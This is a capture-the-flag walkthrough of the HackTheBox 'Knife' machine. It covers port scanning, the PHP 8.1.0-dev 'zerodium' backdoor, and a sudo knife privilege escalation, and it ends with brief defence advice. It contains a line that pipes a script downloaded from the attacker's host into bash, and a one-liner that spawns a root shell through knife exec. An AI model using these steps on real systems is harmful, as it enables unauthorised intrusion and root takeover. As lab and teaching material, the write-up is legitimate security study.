---
description: >-
  Knife is an easy difficulty Linux machine that features an app which is
  running on a  version of PHP. This vulnerability is leveraged to obtain the
  foothold on the server. A sudo misconfigurat
---

# Knife - HTB

```bash
ports=$(nmap -p- --min-rate=1000 -T4 10.10.10.242 | grep ^[0-9] | cut -d '/' -f 1 | tr '\n' ',' | sed s/,$//)

```

**What Each Part Does:**

| Command                                     | Explanation                                                                                          |
| ------------------------------------------- | ---------------------------------------------------------------------------------------------------- |
| `nmap -p- --min-rate=1000 -T4 10.10.10.242` | Scans **all 65,535 ports** with a fast rate (`--min-rate=1000`) using **aggressive timing** (`-T4`). |
| `grep ^[0-9]`                               | Filters lines that **start with a number** (i.e., open ports).                                       |
| `cut -d '/' -f 1`                           | Extracts the **port numbers** from the `nmap` output.                                                |
| `tr '\n' ','`                               | **Replaces newlines () with commas (`,`)**, formatting ports as `22,80,443`.                         |
| `sed s/,$//`                                | **Removes the trailing comma (`,`)** from the output.                                                |
| `ports=$(...)`                              | **Stores the result** (formatted list of open ports) into the variable **`$ports`**.                 |

```bash
nmap -p$ports -sV -sC 10.10.10.242

```

**🛠️ What Each Part Does:**

| Command         | Explanation                                                         |
| --------------- | ------------------------------------------------------------------- |
| `nmap -p$ports` | Uses the **discovered ports** from the first command.               |
| `-sV`           | **Service version detection** (e.g., Apache 2.4.51, OpenSSH 8.2p1). |
| `-sC`           | Runs **default `nmap` scripts** (similar to `--script=default`).    |
| `10.10.10.242`  | **Target IP address**.                                              |
| **One liner**   |                                                                     |

```bash
nmap -p$(nmap -p- --min-rate=1000 -T4 10.10.10.242 | grep ^[0-9] | cut -d '/' -f 1 | tr '\n' ',' | sed s/,$//) -sV -sC 10.10.10.242

```

Then we fuzz the web directory with ffuf

```bash
 ffuf -w common.txt  -u http://10.129.161.31/FUZZ 

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v2.1.0-dev
________________________________________________

 :: Method           : GET
 :: URL              : http://10.129.161.31/FUZZ
 :: Wordlist         : FUZZ: /usr/share/seclists/Discovery/Web-Content/common.txt
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
________________________________________________

.htpasswd               [Status: 403, Size: 278, Words: 20, Lines: 10, Duration: 49ms]
.hta                    [Status: 403, Size: 278, Words: 20, Lines: 10, Duration: 49ms]
.htaccess               [Status: 403, Size: 278, Words: 20, Lines: 10, Duration: 51ms]
index.php               [Status: 200, Size: 5815, Words: 646, Lines: 221, Duration: 49ms]
server-status           [Status: 403, Size: 278, Words: 20, Lines: 10, Duration: 47ms]
:: Progress: [4734/4734] :: Job [1/1] :: 829 req/sec :: Duration: [0:00:05] :: Errors: 0 ::

```

Then, we use `wappalazier`to analyze the technology behind the webapp. We found a vulnerable version of `PHP-8.1.0-DEV`

## 1. Exploit

&#x20;https://github.com/flast101/php-8.1.0-dev-backdoor-rc

#### **🚀 How It Works**

1. **Looks for a special `User-AgentT` header** in the request (notice the typo: `User-AgentT` instead of `User-Agent`).
2. **If the header contains `"zerodium"`**, the backdoor runs **any PHP code** inside that header.
3. **Example Attack Request:**

**Upgrade the shell to fully interactive**

```bash
python3 -c 'import pty;pty.spawn("/bin/bash")'
ctrl+z
stty raw -echo
fg
reset
xterm
```

**Privilege escalation**

```bash
wget https://github.com/peass-ng/PEASS-ng/releases/download/20240714-
cd435bb2/linpeas.sh
```

Then, we start a python in the same server:

```bash
sudo python3 -m http.server 80
```

We use curl on the reverse shell and pipe out the output to `bash`

```bash
curl myip/linpeas.sh|bash
```

### **2. What is `knife`?**

* `knife` is the **command-line tool** for managing **Chef servers and clients**.
* It allows administrators to execute commands remotely.

If `knife` is **misconfigured** in `sudo` permissions, an attacker can **abuse it** to gain **root shell access**.

### **3. Breaking Down the Exploit**

`sudo knife exec --exec "exec '/bin/sh -i'"`

#### **🛠️ Step-by-Step Execution**

1. **`sudo knife exec`** → Runs a Ruby script within `knife` (with `sudo` = **root privileges**).
2. **`--exec "exec '/bin/sh -i'"`** → Executes a command **inside a Ruby script**.
3. **`exec '/bin/sh -i'`** → Starts an **interactive shell (`sh`)** with **root privileges**.

### **4. Why This is Privilege Escalation?**

* If a user has **`sudo knife` permissions**, it can execute **arbitrary commands as root**.
* `knife exec` allows running **system commands** in Ruby, which can spawn a shell.
* Since `sudo` runs `knife` **as root**, the shell (`/bin/sh -i`) will also be **root**.

#### **🛠️ Step 2: Execute the Exploit**

`sudo knife exec --exec "exec '/bin/sh -i'"`

* If successful, you'll get a **root shell** (`#` prompt instead of `$`).

#### **🐍 Alternative (If `/bin/sh` is blocked)**

Try **spawning Bash instead**: `sudo knife exec --exec "exec '/bin/bash -i'"`

### **5. How to Defend Against This?**

1. **Restrict `sudo knife` permissions**
   * Remove `NOPASSWD: /usr/bin/knife` from `/etc/sudoers`.
2. **Disable Ruby execution in `knife`**
   * Set restrictions in **Chef server settings**.

## Final thoughts

Knife was an easy machine, definitely the foothold wasn't hard as the same for the privilege escalation.&#x20;
